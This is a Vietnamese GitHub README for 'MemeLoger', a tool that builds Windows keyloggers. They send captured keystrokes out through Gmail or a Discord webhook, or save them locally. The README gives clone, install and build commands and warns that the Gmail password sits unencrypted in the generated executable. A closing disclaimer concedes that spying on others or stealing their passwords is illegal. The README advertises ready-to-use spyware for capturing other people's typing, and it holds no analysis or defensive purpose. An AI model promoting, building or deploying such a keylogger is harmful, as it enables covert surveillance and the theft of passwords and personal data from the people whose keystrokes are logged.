# MemeLoger
MemeLoger là một công cụ cho phép bạn tạo keylogger cho hệ điều hành Windows.

Các tính năng của MemeLogger bao gồm: 
  - **Keylogger từ xa qua Gmail**: Gửi dữ liệu bàn phím đến Gmail của bạn
  - **Keylogger từ xa qua Discord**: Gửi dữ liệu bàn phím thông qua webhook Discord
  - **Keylogger cục bộ**: Lưu trữ dữ liệu bàn phím trực tiếp trên thiết bị


## Cài đặt
### Bạn có thể cài đặt bằng cách:
#### 1. Clone kho lưu trữ này bằng cách sử dụng git:
```bash
git clone https://github.com/memecoder12345678/memelogger.git
```
#### 2. Sau đó cài đặt thư viện dùng lệnh:
```bash
pip install -r requirements.txt
```
#### 3. Để khởi chạy công cụ, chạy lệnh:
```
python build.py
```
#### 4. Hãy nhập các tùy chọn và công cụ sẽ bắt đầu tạo keylogger.

**Lưu ý**: Nếu không có **Python** và **Git**, bạn có thể cài đặt bằng đường dẫn sau: [Python](https://www.python.org/downloads "Trang cài đặt Python"), [Git](https://git-scm.com/downloads "Trang cài đặt Git")

## Lưu ý quan trọng
**Nếu bạn sử dụng Keylogger từ xa qua Gmail**:
  - Bạn cần bật tính năng **Less secure app access** trong cài đặt tài khoản Google của mình
  - Mật khẩu Gmail của bạn sẽ được lưu trữ dưới dạng **văn bản thuần** trong tệp exe và sẽ **không được mã hóa**
  - Hãy sử dụng tài khoản Google **không quan trọng** vì lý do bảo mật
## Cảnh báo miễn trừ trách nhiệm
Tôi sẽ **không chịu bất kì một trách nhiệm pháp lý** nào nếu bạn **lạm dụng** công cụ này để theo dõi, đánh cắp thông tin cá nhân, mật khẩu,... của người khác, vì điều này là **bất hợp pháp**.
